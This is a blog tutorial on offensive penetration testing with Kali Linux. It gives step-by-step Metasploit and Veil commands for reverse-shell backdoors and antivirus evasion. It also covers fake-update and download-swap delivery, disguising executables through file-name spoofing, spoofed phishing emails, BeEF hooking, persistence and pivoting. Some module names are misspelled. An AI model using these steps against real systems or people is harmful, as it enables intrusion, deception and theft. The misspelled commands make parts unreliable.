Title: Gaining Access with Kali Linux
Date: 2020-09-04
Author: Jack McKew
Category: Software, infosec
Tags: software, infosec

This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: <https://www.kali.org/downloads/>.

This post is apart of a series of posts, see the other posts at:

- [Network Hacking with Kali Linux](https://jackmckew.dev/network-hacking-with-kali-linux.html)
- [Web Penetration Testing with Kali Linux](https://jackmckew.dev/web-penetration-testing-with-kali-linux.html)

> Thank you to Chris B for helping me with the notes in this post below!

## Table of Contents <!-- omit in toc -->

- [Gaining Access](#gaining-access)
    - [Server Side Attacks](#server-side-attacks)
        - [Metasploit](#metasploit)
        - [Exploiting Backdoors](#exploiting-backdoors)
            - [An Example Backdoor Attack](#an-example-backdoor-attack)
            - [Payloads](#payloads)
        - [Nexpose](#nexpose)
    - [Client Side Attacks](#client-side-attacks)
        - [Creating Backdoors](#creating-backdoors)
            - [Connecting from the Backdoor](#connecting-from-the-backdoor)
            - [Deploying Backdoors via Fake Updates](#deploying-backdoors-via-fake-updates)
            - [Deploying Backdoors via Exe Downloads](#deploying-backdoors-via-exe-downloads)
        - [Protection](#protection)
    - [Social Engineering](#social-engineering)
        - [Maltego](#maltego)
        - [Backdooring Any File Type](#backdooring-any-file-type)
            - [Spoofing File Type](#spoofing-file-type)
        - [Spoofing Fake Emails](#spoofing-fake-emails)
        - [BeEF (Browser Exploitation Framework)](#beef-browser-exploitation-framework)
        - [Using the Above - Outside the Local Network](#using-the-above---outside-the-local-network)
- [Post Exploitation](#post-exploitation)
    - [Maintaining Access](#maintaining-access)
    - [Pivoting](#pivoting)

## Gaining Access

Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc
Two types of attacks:

1. Server side - Doesn't require user interaction all we need is an IP
2. Client side - Requires user interaction such as opening a file or clicking a link

### Server Side Attacks

Make sure the machine is pingable (open terminal and run `ping [IP]`). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as:

- Operating systems
- Installed programs
- Ports being used
- etc

We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are:

- Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured.
- Google the version of operating system / programs for potential exploits
- If you find an open FTP (file transfer protocol) port, try to connect through it
- Try default usernames and passwords to log in (sometimes they won't have a password)


#### Metasploit

Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: <https://information.rapid7.com/download-metasploitable-2017.html>.


#### Exploiting Backdoors

First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as:

- `msfconsole` (runs the metasploit console)
- `help` (help on any command)
- `show [something]` (something can be exploits, payloads, auxilaries or options)
- `use [something]` (uses an exploit, payload, auxilarie)
- `set [option] [value]` (configure [option] to have [value] )
- `exploit` - runs the current task

##### An Example Backdoor Attack

Typically this will only work if the backdoor is already installed on the target computer.

1. find out the exploit to use via google
2. open `msfconsole`
3. type `use [exploit_name/path]`
4. `show options`
5. set the options (usually the RHOSTS) `set RHOSTS [ip]
6. run `exploit`

If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine.

##### Payloads

A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to:

- to open a port on the target and connect to it (aka `bind`)
- open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka `reverse`)

> On a `reverse`, setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration.

Setting a payload in metasploit can be done with the option `set payload [payload]`.

#### Nexpose

Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective!

[![Nexpose]({static img/nexpose.jpg})](https://www.rapid7.com/products/nexpose/)

Nexpose can be downloaded from: <https://www.rapid7.com/products/nexpose/>.

> There is a free community edition!

### Client Side Attacks

Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack.

#### Creating Backdoors

For creating backdoors we use a program called `veil`. Veil can installed via `apt-get`, and the source code is all open over at: <https://github.com/Veil-Framework/Veil>.

To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):

1. Run `veil`
2. `list` to list available tools
3. `use [toolname]` to use tools, evasion is a typical tool to use
4. `list` (under a tool) to see available payloads
5. `use [payload number]`
6. check the options to set
7. be sure to set the LHOST (the IP for the target to connect to)
8. `set LHOST [ip]`
9. if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)
10. `set LPORT 8080`
11. `options` to see options.

> For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with
    1.  `set PROCESSORS [number(1)]` change processors.
    2.  `set SLEEP [number(6)]`

Finally use `generate` to make backdoor.

- To check if it is detectable you can use the check vt command (this will only check signatures)
- go to <https://nodistribute.com/> and scan there

##### Connecting from the Backdoor

We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080)

1. Open the metasploit framework. `msfconsole`
2. To listen use the handler module
3. `use exploit/multi/handler`
4. set the payload `set PAYLOAD windows/meterpeter/reverse_https`
5. set the correct settings (the LPORT and LHOST you used in the backdoor).
6. `exploit`

Now we wait for the target user to run the backdoor (the `.exe` file).

##### Deploying Backdoors via Fake Updates

By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use `Evilgrade` (which is also fully open source): <https://github.com/infobyte/evilgrade>. Once `evilgrade` is installed, you can check hijackable programs using `show modules`, configure options for said modules using `configure [module_name]` and start `evilgrade` with `start`.

This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST].

> When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software.

##### Deploying Backdoors via Exe Downloads

Another way to deploy backdoors, is to intercept an `.exe` that is being downloaded on the target and replace it with the malicious `.exe`. It's necessary to be the MITM to undertake this attack.

One way to do this (although unsupported as of 08/2017) is via BDFProxy: <https://github.com/secretsquirrel/BDFProxy>.

Once up and running, whenever a user attempts to download an `.exe`, it'll be intercepted and injected with the malicious backdoor. Note that the target `.exe` will be downloaded and run as normal, not raising any suspicions from the user.

#### Protection

- Ensure that there is no MITM in your network
- Only download from HTTPS pages
- Use checksums to ensure the download is as the provider desired it to be (eg, MD5)

### Social Engineering

The definition of social engineering (in information security context) is: "the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack.

#### Maltego

Maltego is a piece of software that we can easily & quickly gather information about a target, it can be downloaded from: <https://www.maltego.com/>. It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client.

#### Backdooring Any File Type

This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a `.exe` file, there will still be a prompt to run this file when opened.

For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack.

##### Spoofing File Type

In the above example, we highlighted concerns that our file will prompt to be run and have the extension `.exe`. We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, `.pdf`). One way to do this is by using the right to left unicode character in the filename (`U+202E`).

So what we will do is if our target file that we want to disguise as is name `the-book-of-reflex.pdf`. We will name our malicious executable as `the-book-of-reflfdp.exe`, and insert a right to left unicode character before `fdp.exe`, which will reverse the end of our file, thus ending up with `the-book-of-reflexe.pdf`.

> Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this.

#### Spoofing Fake Emails

There's lots of free options out there on the web for sending fake emails, but they will likely end up in the spam box of the target's email. Another option is to find a SMTP (Simple Mail Transfer Protocol) server that offers a free program, typically these are used for marketing by companies so less likely to end up in the spam.

Kali also provides a utility called `sendemail` which we can use once we have a SMTP server to use. Find out more about this utility (with the source code) over at: <https://github.com/mogaal/sendemail>.

Once we're able to send a fake email, we can now embed our spoofed malicious executable on a file sharing website (eg, Google drive) and include it in the email (see [Backdooring Any File Type](#backdooring-any-file-type)).

> It's advisable to use an existing email that you know your target is familiar with from the information that you've gathered.

#### BeEF (Browser Exploitation Framework)

From the BeEF website itself: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.". You can also find the source code over at <https://github.com/beefproject/beef>.

What BeEF let's us do is insert some JavaScript code onto a website to 'hook' the website, allowing us to do lots of different things (eg, fake login pages, etc). Since the hook is just embedded in sites with JavaScript, this will enable attacks on any modern browser and device (eg, phones, tablets, laptops, etc).

Once hooked you get all sorts of information on the target system including browser version, operating system, versions of capabilities (plugins) installed etc.

> It is easiest to deploy BeEF and run the commands when you are the MITM in the network. This will also allow us to hook **all** websites the user visits rather than just the one.

One example command we can use is to mimic a browser plug-in update to get the target to download and run a malicious backdoor.

#### Using the Above - Outside the Local Network

If you are using any of these attacks external to your local network, there's a few steps to configure to ensure:

1. Router must handle reverse connections
2. Use public IP vs Private IP of the router
3. Forward the targeted port of the router to the attacking machine in the local network

## Post Exploitation

The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting).

### Maintaining Access

Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, `explorer.exe`). If you are using metasploit for this, it's as easy as running `migrate [processID]`.

There's also other methodologies for maintaining access such as:

- Using veil-evasion (see [Creating Backdoors](#creating-backdoors))
- Use metasploit persistence to maintain the connection
- Use metasploit and veil-evasion together:
    1. Background your current meterpeter session `background`
    2. use a module in msfconsole `use exsploit/windows/local/persistance`
    3. `show options` to configure
    4. `set EXE_NAME browser` (or something inconspicuous)
    5. set the session you wish to place `set SESSION [no.]`
    6. use the EXE::Custom the inject veil backdoor (not service).
    7. `set EXE::Custom [path]`
    8. `exploit`

### Pivoting

Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device.

1. Upload any tools you need. (in metasploit) eg. Nmap
2. use autoroute (in metasploit)
3. `use post/windows/manage/autoroute`
4. `set subnet [subnet]` - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0
5. `set session [id]` - Sets the session to run it on.
6. `exploit`
